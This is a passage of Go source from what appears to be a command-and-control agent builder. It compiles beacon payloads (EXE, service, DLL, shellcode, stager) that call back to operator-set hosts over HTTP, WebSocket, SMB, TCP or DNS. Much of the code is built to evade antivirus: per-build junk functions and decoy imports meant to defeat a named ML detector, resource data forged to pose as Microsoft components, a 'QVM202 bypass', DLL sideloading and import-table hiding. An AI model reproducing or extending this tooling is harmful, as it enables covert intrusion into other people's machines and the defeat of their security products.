	return string(b)
}

func generateJunkCodeC() string {
	junkPool := []string{
		"int x = %d; for(int i=0; i<%d; i++) { x += i; }",
		"if(GetTickCount() == 0xdeadbeef) { ExitProcess(0); }",
		"void* p = VirtualAlloc(NULL, %d, MEM_COMMIT, PAGE_READWRITE); if(p) VirtualFree(p, 0, MEM_RELEASE);",
		"char buf[%d]; memset(buf, 0x%02x, sizeof(buf));",
		"for(int j=0; j<%d; j++) { SwitchToThread(); }",
	}

	count := rand.IntN(3) + 2
	var lines []string
	for i := 0; i < count; i++ {
		fmtStr := junkPool[rand.IntN(len(junkPool))]
		line := fmt.Sprintf(fmtStr, rand.IntN(1000), rand.IntN(100), rand.IntN(512), rand.IntN(64), rand.IntN(255), rand.IntN(50))
		lines = append(lines, line)
	}
	return strings.Join(lines, "\n    ")
}

// decoyApiPool — legit-looking APIs from DLLs the beacon already links
// (kernel32/user32/advapi32). Referencing a random subset per build varies
// the IAT fingerprint, which QVM 2.0's ML model keys on. Each reference
// forces an IAT entry the linker keeps (referenced from a constructor).
var decoyApiPool = []string{
	// kernel32
	"GetSystemTime", "GetLocalTime", "GetTickCount", "GetWindowsDirectoryW",
	"GetSystemDirectoryW", "GetCurrentDirectoryW", "FindFirstFileW", "FindNextFileW",
	"FindClose", "GetFileAttributesW", "CreateDirectoryW", "DeleteFileW",
	"CopyFileW", "MoveFileW", "GetEnvironmentVariableW", "ExpandEnvironmentStringsW",
	"GetLogicalDrives", "GetDriveTypeW", "GetVolumeInformationW", "GlobalAlloc",
	"GlobalFree", "GlobalLock", "GlobalUnlock", "lstrlenW",
	// user32
	"GetSysColor", "GetSystemMetrics", "GetDesktopWindow", "GetForegroundWindow",
	"ShowWindow", "GetWindowRect", "GetClientRect", "GetCursorPos",
	"ShowCursor", "MessageBeep", "GetDoubleClickTime", "SwapMouseButton",
	// advapi32
	"RegOpenKeyExW", "RegQueryValueExW", "RegCloseKey", "RegCreateKeyExW",
	"RegSetValueExW", "RegDeleteKeyW", "OpenProcessToken", "GetTokenInformation",
	"LookupPrivilegeValueW", "AdjustTokenPrivileges", "GetUserNameW", "GetComputerNameW",
}

// generateDiversificationC produces a per-build diversify.c: random junk
// functions + a random subset of decoy API references, all kept alive by a
// constructor (so --gc-sections can't strip them). This varies the .text hash
// AND the IAT per build, so QVM's cloud ML can't converge on a single pattern.
func generateDiversificationC() string {
	var b strings.Builder
	b.WriteString("#include <windows.h>\n\n")
	// 8-12 junk functions (referenced from the constructor below).
	nJunk := rand.IntN(5) + 8
	junkNames := make([]string, 0, nJunk)
	for i := 0; i < nJunk; i++ {
		name := "Ax_junk_" + generateRandomString(6)
		junkNames = append(junkNames, name)
		b.WriteString(fmt.Sprintf("__attribute__((used)) static void %s(void) {\n", name))
		b.WriteString(fmt.Sprintf("    volatile unsigned int a = 0x%xu, b = 0x%xu;\n", rand.IntN(0xFFFFFFFF), rand.IntN(0xFFFFFFFF)))
		b.WriteString("    volatile unsigned int c = (a ^ b) + (a << 1) + b;\n")
		b.WriteString("    if (c == 0x1337) { a = b; } (void)a; (void)b; (void)c;\n}\n\n")
	}
	// 20-28 random decoy API references — each forces an IAT entry.
	nDecoy := rand.IntN(9) + 20
	chosen := make(map[string]bool)
	b.WriteString("__attribute__((constructor)) static void Ax_diversify_init(void) {\n")
	for i := 0; i < nDecoy; i++ {
		api := decoyApiPool[rand.IntN(len(decoyApiPool))]
		if chosen[api] {
			continue
		}
		chosen[api] = true
		b.WriteString(fmt.Sprintf("    volatile void (*volatile p%d)() = (void(*)())%s; (void)p%d;\n", i, api, i))
	}
	// ★ 必须**逐个**引用。`__attribute__((used))` 只挡得住编译器丢弃，挡不住链接器的
	//   --gc-sections；而 -ffunction-sections 下每个 junk 函数各占一节，只调第一个的话
	//   其余 7~11 个照样被回收 —— 那样多样化的实际变化量只剩一个函数。
	for _, n := range junkNames {
		b.WriteString(fmt.Sprintf("    %s();\n", n))
	}
	b.WriteString("}\n")
	return b.String()
}

// generateDynamicStrObfuscate was here (dead code, never called — the beacon
// uses the committed static StrObfuscate.h). Removed during buildenv.mk
// consolidation to eliminate misleading "aspirational" dead code.

//go:embed buildenv.mk
var buildenvRaw string

// buildEnv is the single source of truth, parsed from buildenv.mk at init.
// Both pl_main.go and src_beacon/Makefile consume buildenv.mk so compiler /
// flags / behavior toggles stay in sync without duplicate hardcodes.
var buildEnv = func() map[string]string {
	m := make(map[string]string)
	raw := strings.ReplaceAll(buildenvRaw, "\\\n", " ") // make-style line continuations
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		var key, val string
		if i := strings.Index(line, ":="); i >= 0 {
			key, val = strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+2:])
		} else if i := strings.Index(line, "="); i >= 0 {
			key, val = strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+1:])
		} else {
			continue
		}
		m[key] = val
	}
	// expand make-style $(KEY) references so pl_main.go sees final values
	// (e.g. BEACON_CFLAGS references $(BEACON_OPTIM) -> -O2)
	for pass := 0; pass < 3; pass++ {
		for k, v := range m {
			for k2, v2 := range m {
				v = strings.ReplaceAll(v, "$("+k2+")", v2)
			}
			m[k] = v
		}
	}
	return m
}()

var (
	ObjectDir_http = "objects_http"
	ObjectDir_smb  = "objects_smb"
	ObjectDir_tcp  = "objects_tcp"
	ObjectDir_dns  = "objects_dns"
	ObjectDir_ws   = "objects_ws"
	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "Connector", "crt", "Crypt", "Downloader", "Encoders", "EntropyEvasion", "IatDisguise", "indirect_syscall", "IndirectSyscall", "JobsController", "LdrResolve", "MainAgent", "MemorySaver", "OpsecGadget", "OpsecSleep", "OpsecThread", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
	// From buildenv.mk (single source, shared with src_beacon/Makefile).
	CFlags = "-c " + buildEnv["BEACON_CFLAGS"]
	LFlags = buildEnv["BEACON_LDFLAGS"]
)

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		/// START CODE HERE

		var (
			generateConfig GenerateConfig
			params         []interface{}
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		kill_date := 0
		if generateConfig.IsKillDate {
			dt := generateConfig.Killdate + " " + generateConfig.Killtime
			t, err := time.Parse("02.01.2006 15:04:05", dt)
			if err != nil {
				err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
				return nil, err
			}
			kill_date = int(t.Unix())
		}

		working_time := 0
		if generateConfig.IsWorkingTime {
			t := generateConfig.StartTime + "-" + generateConfig.EndTime
			working_time, err = parseStringToWorkingTime(t)
			if err != nil {
				return nil, err
			}
		}

		sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
		if err != nil {
			return nil, err
		}

		lWM := strings.ToLower(strings.TrimSpace(transportProfile.Watermark))
		if len(lWM) != 8 {
			return nil, fmt.Errorf("listener watermark must be 8 hex digits, got %q", transportProfile.Watermark)
		}
		lWatermarkVal, err := strconv.ParseUint(lWM, 16, 32)
		if err != nil {
			return nil, fmt.Errorf("listener watermark: %w", err)
		}

		encrypt_key, ok := listenerMap["encrypt_key"].(string)
		if !ok || encrypt_key == "" {
			return nil, errors.New("listener profile: encrypt_key is required")
		}
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}
		if len(encryptKey) != 16 {
			return nil, errors.New("encrypt_key must be 32 hex characters (16 bytes)")
		}

		params = append(params, int(agentWatermark))
		params = append(params, kill_date)
		params = append(params, working_time)
		params = append(params, sleepSeconds)
		params = append(params, generateConfig.Jitter)
		params = append(params, int(lWatermarkVal))

		protocol := inferBeaconProtocol(listenerMap)
		switch protocol {

		case "http":
			fallthrough

		case "ws":

			lines, _ := listenerMap["callback_addresses"].([]interface{})
			UriRaw, _ := listenerMap["uri"].([]interface{})
			UserAgentRaw, _ := listenerMap["user_agent"].([]interface{})
			HostHeaderRaw, _ := listenerMap["host_header"].([]interface{})

			HttpMethod, _ := listenerMap["http_method"].(string)
			Ssl, _ := listenerMap["ssl"].(bool)
			ParameterName, _ := listenerMap["hb_header"].(string)
			RequestHeaders, _ := listenerMap["request_headers"].(string)
			RequestHeaders = strings.TrimLeft(RequestHeaders, "\r\n \t")
			if RequestHeaders != "" && !strings.HasSuffix(RequestHeaders, "\r\n") {
				RequestHeaders += "\r\n"
			}

			var Hosts []string
			var Ports []int
			for _, i_line := range lines {
				line := strings.TrimSpace(i_line.(string))
				if line == "" {
					continue
				}

				host, portStr, _ := net.SplitHostPort(line)
				port, _ := strconv.Atoi(portStr)

				Hosts = append(Hosts, host)
				Ports = append(Ports, port)
			}
			c2Count := len(Hosts)
			if c2Count == 0 {
				return nil, errors.New("http profile: need at least one valid callback_addresses entry (host:port)")
			}

			var Uris []string
			for _, i_line := range UriRaw {
				u := strings.TrimSpace(i_line.(string))
				if u != "" {
					Uris = append(Uris, u)
				}
			}

			var UserAgents []string
			for _, i_line := range UserAgentRaw {
				ua := strings.TrimSpace(i_line.(string))
				if ua != "" {
					UserAgents = append(UserAgents, ua)
				}
			}

			var HostHeaders []string
			for _, i_line := range HostHeaderRaw {
				hh := strings.TrimSpace(i_line.(string))
				if hh != "" {
					HostHeaders = append(HostHeaders, hh)
				}
			}

			var ansOffset1, ansOffset2 int
			if protocol == "http" {
				WebPageOutput, _ := listenerMap["page-payload"].(string)
				ansOffset1 = strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
				if ansOffset1 < 0 {
					return nil, errors.New("http profile: page-payload must contain <<<PAYLOAD_DATA>>>")
				}
				ansOffset2 = len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
			}
			// WS: ConnectorWS uses find_b64_in_data() — no ans offsets needed

			rotationMode := 0 // 0=sequential, 1=random
			if generateConfig.RotationMode == "random" {
				rotationMode = 1
			}

			params = append(params, Ssl)
			params = append(params, c2Count)
			for i := 0; i < c2Count; i++ {
				params = append(params, Hosts[i])
				params = append(params, Ports[i])
			}
			params = append(params, HttpMethod)
			params = append(params, len(Uris))
			for _, u := range Uris {
				params = append(params, u)
			}
			params = append(params, ParameterName)
			params = append(params, len(UserAgents))
			for _, ua := range UserAgents {
				params = append(params, ua)
			}
			params = append(params, RequestHeaders)
			params = append(params, ansOffset1)
			params = append(params, ansOffset2)
			params = append(params, len(HostHeaders))
			for _, hh := range HostHeaders {
				params = append(params, hh)
			}
			params = append(params, rotationMode)
			proxyType := 0 // 0=none, 1=http, 2=https
			if generateConfig.UseProxy {
				if generateConfig.ProxyType == "https" {
					proxyType = 2
				} else {
					proxyType = 1 // default to http
				}
			}
			params = append(params, proxyType)
			params = append(params, generateConfig.ProxyHost)
			params = append(params, generateConfig.ProxyPort)
			params = append(params, generateConfig.ProxyUsername)
			params = append(params, generateConfig.ProxyPassword)

		case "bind_smb":

			pipename, _ := listenerMap["pipename"].(string)
			pipename = strings.TrimSpace(pipename)
			if pipename == "" {
				return nil, errors.New("bind_smb profile: pipename is required")
			}
			pipename = "\\\\.\\pipe\\" + pipename

			params = append(params, pipename)

		case "bind_tcp":
			prepend, _ := listenerMap["prepend_data"].(string)
			port, _ := listenerMap["port_bind"].(float64)

			params = append(params, prepend)
			params = append(params, int(port))

		case "dns":
			userAgent := generateConfig.UserAgent
			if userAgent == "" {
				userAgent = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"
			}
			// Append, never assign: `params` already holds the six-field common
			// prefix added above (agent_type, kill_date, working_time, sleep_delay,
			// jitter_delay, listener_type). Overwriting it makes the C side
			// (AgentConfig.cpp, BEACON_DNS branch) read every DNS field one slot
			// early -- it takes this list's string length prefixes for integers,
			// so kill_date lands in 1994 and Agent_IsActive() declares the agent
			// dead before its first beat. The other four flavours all append.
			dnsParams, dnsErr := buildDNSProfileParams(generateConfig, listenerMap, userAgent)
			if dnsErr != nil {
				return nil, dnsErr
			}
			params = append(params, dnsParams...)

		default:
			return nil, errors.New("protocol unknown")
		}

		transportSalt := make([]byte, 16)
		if _, err := crand.Read(transportSalt); err != nil {
			return nil, err
		}
		params = append(params, transportSalt)

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}

		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile, err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}

		profileString := ""
		for _, b := range packedProfile {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))

		/// END CODE HERE
	}
	return agentProfiles, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	/// START CODE HERE

	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("only one listener profile is supported")
	}
	listenerProfile := profile.ListenerProfiles[0].Profile
	agentProfile := agentProfiles[0]

	var listenerMap map[string]any
	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
		return nil, "", err
	}

	var (
		generateConfig GenerateConfig
		ConnectorFile  string
		ObjectDir      string
		Compiler       string
		Ext            string
		stubPath       string
		buildPath      string
		cmdConfig      string
	)

	postLibs := ""

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}
	iatHide := generateConfig.effectiveIatHiding()
	stagerMode := generateConfig.Format == "Stager"
	if stagerMode {
		// Inner artifact is shellcode; outer product is a small stomping loader.
		generateConfig.Format = "Shellcode"
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Format Stager: building inner shellcode then Windows stager EXE")
	}

	// Compiler from buildenv.mk (default: mingw GCC — QVM 2.0 flags clang-
	// compiled PEs as HEUR/QVM.9B7A; gcc is not flagged). GCC encodes the
	// target in the compiler name, so no -target flag (unlike clang).
	if generateConfig.Arch == "x86" {
		Compiler = buildEnv["BEACON_CC_X86"]
	} else {
		Compiler = buildEnv["BEACON_CC_X64"]
	}
	cFlags := CFlags
	lFlags := LFlags

	// No-CRT default: -nostdlib + custom crt.cpp; IAT/entry when iatHide (see effectiveIatHiding).
	if iatHide {
		cFlags += " -DIAT_HIDING"
		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
	}

	currentDir := ModuleDir
	if abs, errAbs := filepath.Abs(currentDir); errAbs == nil {
		currentDir = abs
	}
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	protocol := inferBeaconProtocol(listenerMap)
	if protocol == "http" {
		ObjectDir = ObjectDir_http
		ConnectorFile = "ConnectorHTTP"
	} else if protocol == "bind_smb" {
		ObjectDir = ObjectDir_smb
		ConnectorFile = "ConnectorSMB"
	} else if protocol == "bind_tcp" {
		ObjectDir = ObjectDir_tcp
		ConnectorFile = "ConnectorTCP"
	} else if protocol == "dns" {
		ObjectDir = ObjectDir_dns
		ConnectorFile = "ConnectorDNS"
	} else if protocol == "ws" {
		ObjectDir = ObjectDir_ws
		ConnectorFile = "ConnectorWS"
	} else {
		return nil, "", errors.New("protocol unknown")
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))

	if generateConfig.Arch == "x86" {
		Ext = ".x86.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
	} else {
		Ext = ".x64.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
	}
	// 本次生成伪装成哪个程序 —— **只在这里取一次**，文件名 / 版本信息 / 签名主体
	// 三处全部用它，保证同一个产物自己前后一致。
	// 每次生成随机取（不是固定一个）：固定名会让多份样本在目标机/沙箱里互相关联。
	//
	// ★ 身份池由 effectiveDisguise() 选：开 = 冒充微软自家组件，关 = 中性虚构厂商。
	//   两套池的子结构完全一样，所以下游（文件名/版本信息/签名主体）一个字都不用改。
	identityPool := benignExePool
	identityCompany := "Microsoft Corporation"
	if !generateConfig.effectiveDisguise() {
		identityPool = neutralExePool
		identityCompany = neutralSignIssuer
	}
	chosen := identityPool[rand.IntN(len(identityPool))]
	Filename = chosen.name

	svcName := ""
	for _, char := range generateConfig.SvcName {
		svcName += fmt.Sprintf("\\x%02x", char)
	}

	var entBuf [4]byte
	_, _ = crand.Read(entBuf[:])
	cfgEntropy := binary.BigEndian.Uint32(entBuf[:])

	agentProfileSize := len(agentProfile) / 4
	if generateConfig.Format == "Service Exe" {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DBUILD_SVC -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -DAX_CFG_ENTROPY_U32=0x%08x -o %s/config.o", Compiler, cFlags, ObjectDir, svcName, string(agentProfile), agentProfileSize, cfgEntropy, tempDir)
	} else {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -DAX_CFG_ENTROPY_U32=0x%08x -o %s/config.o", Compiler, cFlags, ObjectDir, string(agentProfile), agentProfileSize, cfgEntropy, tempDir)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")

	var buildArgsConfig []string
	buildArgsConfig = append(buildArgsConfig, "-c", cmdConfig)
	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", buildArgsConfig...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")

	Files := tempDir + "/config.o "
	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
	for _, ofile := range ObjectFiles {
		if ofile == "indirect_syscall" && generateConfig.Arch == "x86" {
			continue
		}
		Files += ObjectDir + "/" + ofile + Ext + " "
	}
	if protocol == "ws" {
		Files += ObjectDir + "/CryptAES" + Ext + " "
	}
	if protocol == "dns" {
		Files = appendDNSObjectFiles(Files, ObjectDir, Ext)
	}

	var linkerLd string
	if iatHide && (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe") {
		var errLd error
		linkerLd, errLd = resolveLinkerLd(currentDir)
		if errLd != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", errLd
		}
	}

	if generateConfig.Format == "Exe" {
		Files += ObjectDir + "/main" + Ext + " "
		buildPath = tempDir + "/file.exe"
		Filename += ".exe"
		postLibs += " -lkernel32 -ladvapi32 -luser32 -lpsapi -lws2_32 -liphlpapi"
		if iatHide {
			postLibs += ""
			Files += ObjectDir + "/entry_exe" + Ext + " "
			lFlags += " -Wl,-T," + linkerLd
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_AxAsmEntry"
			} else {
				lFlags += " -Wl,-e,AxAsmEntry"
			}
		}
	} else if generateConfig.Format == "Service Exe" {
		Files += ObjectDir + "/main_service" + Ext + " "
		buildPath = tempDir + "/svc.exe"
		// 不叫 svc_xxx.exe：svc_ 前缀本身就是"服务版载荷"的标记，真实服务名里没有它
		Filename += ".exe"
		postLibs += " -lkernel32 -ladvapi32 -luser32 -lpsapi -lws2_32 -liphlpapi"
		if iatHide {
			postLibs += ""
			Files += ObjectDir + "/entry_svc" + Ext + " "
			lFlags += " -Wl,-T," + linkerLd
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_AxAsmEntry"
			} else {
				lFlags += " -Wl,-e,AxAsmEntry"
			}
		}
	} else if generateConfig.Format == "DLL" {
		Files += ObjectDir + "/main_dll" + Ext + " "
		lFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".dll"
		postLibs += " -lkernel32 -luser32 -lpsapi -lws2_32 -liphlpapi"
		if iatHide {
			postLibs += ""
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_DllMain@12"
			} else {
				lFlags += " -Wl,-e,DllMain"
			}
		}
		if generateConfig.IsSideloading {
			sideloadingContent, err := base64.StdEncoding.DecodeString(generateConfig.SideloadingContent)
			if err != nil {
				return nil, "", errors.New("unknown sideloading DLL format")
			}
			defPath, err := CreateDefinitionFile(sideloadingContent, tempDir)
			if err != nil {
				return nil, "", err
			}
			lFlags += " " + defPath
		}
	} else if generateConfig.Format == "Shellcode" || generateConfig.Format == "Hex C" {
		Files += ObjectDir + "/main_shellcode" + Ext + " "
		lFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		postLibs += " -lkernel32 -ladvapi32 -luser32 -lpsapi -lws2_32 -liphlpapi"
		if generateConfig.Format == "Hex C" {
			Filename += ".c"
		} else {
			Filename += ".bin"
		}
		if iatHide {
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_DllMain@12"
			} else {
				lFlags += " -Wl,-e,DllMain"
			}
		}
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown file format")
	}

	peWithIcon := generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL"
	var iconData []byte
	if peWithIcon && generateConfig.IconRandom {
		var errGen error
		iconData, errGen = generateRandomICO()
		if errGen != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("random icon: %w", errGen)
		}
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Using randomly generated ICO")
	} else if peWithIcon && strings.TrimSpace(generateConfig.IconContent) != "" {
		var errDec error
		iconData, errDec = base64.StdEncoding.DecodeString(strings.TrimSpace(generateConfig.IconContent))
		if errDec != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", errors.New("invalid icon base64")
		}
		if err := validateICOFile(iconData); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", err
		}
	}
	if peWithIcon && len(iconData) > 0 {
		var iconTag [4]byte
		_, _ = crand.Read(iconTag[:])
		iconBase := fmt.Sprintf("r%x", binary.BigEndian.Uint32(iconTag[:]))
		icoPath := tempDir + "/" + iconBase + ".ico"
		rcPath := tempDir + "/" + iconBase + ".rc"
		resObj := tempDir + "/" + iconBase + ".o"
		if err := os.WriteFile(icoPath, iconData, 0600); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", err
		}
		rcLine := fmt.Sprintf("1 ICON \"%s.ico\"\n", iconBase)
		if err := os.WriteFile(rcPath, []byte(rcLine), 0600); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", err
		}
		windres := "x86_64-w64-mingw32-windres"
		if generateConfig.Arch == "x86" {
			windres = "i686-w64-mingw32-windres"
		}
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling icon resource (windres)...")
		err = Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, windres, "-O", "coff", "-i", iconBase+".rc", "-o", iconBase+".o")
		if err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("windres: %w", err)
		}
		Files += resObj + " "
	}

	// Inject VERSIONINFO + RT_MANIFEST for PE legitimacy (QVM202 bypass)
	if generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL" {
		var rsrcTag [4]byte
		_, _ = crand.Read(rsrcTag[:])
		rsrcBase := fmt.Sprintf("r%x", binary.BigEndian.Uint32(rsrcTag[:]))

		manifestXML := "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
			"<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n" +
			"  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n" +
			"    <security>\n" +
			"      <requestedPrivileges>\n" +
			"        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n" +
			"      </requestedPrivileges>\n" +
			"    </security>\n" +
			"  </trustInfo>\n" +
			"  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n" +
			"    <application>\n" +
			"      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>\n" +
			"      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n" +
			"      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>\n" +
			"      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n" +
			"    </application>\n" +
			"  </compatibility>\n" +
			"  <dependency>\n" +
			"    <dependentAssembly>\n" +
			"      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"/>\n" +
			"    </dependentAssembly>\n" +
			"  </dependency>\n" +
			"</assembly>"

		manifestPath := tempDir + "/" + rsrcBase + "_manifest.xml"
		if err := os.WriteFile(manifestPath, []byte(manifestXML), 0600); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("manifest write: %w", err)
		}

		// Per-build randomized VERSIONINFO strings
		vfRand := rand.Uint32()
		vMajor := 1 + int(vfRand&3)
		vMinor := int((vfRand >> 2) & 7)
		vPatch := int((vfRand >> 5) & 0xFFF)
		vBuild := int((vfRand >> 17) & 0x7FFF)

		// ★ 版本信息必须来自上面那次 chosen —— 单独再挑一个的话，就会出现
		//   "文件叫 RuntimeBroker.exe、属性里写着 Notepad" 这种自相矛盾。
		type viEntry struct{ company, desc, internal, orig, product string }
		vi := viEntry{
			identityCompany,
			chosen.desc,
			chosen.name,
			chosen.name + ".exe",
			chosen.product,
		}

		rcContent := "1 VERSIONINFO\n" +
			fmt.Sprintf("FILEVERSION     %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
			fmt.Sprintf("PRODUCTVERSION  %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
			"FILEFLAGSMASK   0x3fL\n" +
			"FILEFLAGS       0x0L\n" +
			"FILEOS          0x40004L\n" +
			"FILETYPE        0x1L\n" +
			"FILESUBTYPE     0x0L\n" +
			"BEGIN\n" +
			"    BLOCK \"StringFileInfo\"\n" +
			"    BEGIN\n" +
			"        BLOCK \"040904B0\"\n" +
			"        BEGIN\n" +
			fmt.Sprintf("            VALUE \"CompanyName\", \"%s\"\n", vi.company) +
			fmt.Sprintf("            VALUE \"FileDescription\", \"%s\"\n", vi.desc) +
			fmt.Sprintf("            VALUE \"FileVersion\", \"%d.%d.%d.%d\"\n", vMajor, vMinor, vPatch, vBuild) +
			fmt.Sprintf("            VALUE \"InternalName\", \"%s\"\n", vi.internal) +
			"            VALUE \"LegalCopyright\", \"Microsoft Corporation. All rights reserved.\"\n" +
			fmt.Sprintf("            VALUE \"OriginalFilename\", \"%s\"\n", vi.orig) +
			fmt.Sprintf("            VALUE \"ProductName\", \"%s\"\n", vi.product) +
			fmt.Sprintf("            VALUE \"ProductVersion\", \"%d.%d.%d.%d\"\n", vMajor, vMinor, vPatch, vBuild) +
			"        END\n" +
			"    END\n" +
			"    BLOCK \"VarFileInfo\"\n" +
			"    BEGIN\n" +
			"        VALUE \"Translation\", 0x409, 1200\n" +
			"    END\n" +
			"END\n" +
			"\n" +
			"1 24 \"" + rsrcBase + "_manifest.xml\"\n"

		rcPath := tempDir + "/" + rsrcBase + ".rc"
		rsrcObj := tempDir + "/" + rsrcBase + ".o"
		if err := os.WriteFile(rcPath, []byte(rcContent), 0600); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("resource rc write: %w", err)
		}

		windres := "x86_64-w64-mingw32-windres"
		if generateConfig.Arch == "x86" {
			windres = "i686-w64-mingw32-windres"
		}
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling PE resources (windres)...")
		if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, windres, "-O", "coff", "-i", rsrcBase+".rc", "-o", rsrcBase+".o"); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("windres: %w", err)
		}
		Files += rsrcObj + " "
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))

	// L2 Per-build diversification (buildenv.mk: BEACON_DIVERSIFY): random junk
	// functions + random decoy API references (varies .text hash + IAT per build
	// so QVM cloud ML can't converge on a single pattern). Compiled as a
	// separate .o and linked in.
	if generateConfig.effectiveDiversify() {
		divSrc := tempDir + "/diversify.c"
		divObj := tempDir + "/diversify" + Ext
		if err := os.WriteFile(divSrc, []byte(generateDiversificationC()), 0600); err == nil {
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling per-build diversification (junk + decoy imports)...")
			// ★ `-x c` 不能省：generateDiversificationC() 产出的是 **C**，而 Compiler 是
			//   `x86_64-w64-mingw32-g++` —— g++ 按**文件扩展名以外的规则**把 `.c` 也当 C++ 编，
			//   于是 `volatile void (*volatile p0)() = (void(*)())GetModuleHandleW;` 这种
			//   合法 C 直接变成 C++ 硬错误（invalid conversion from 'void (*)()' to
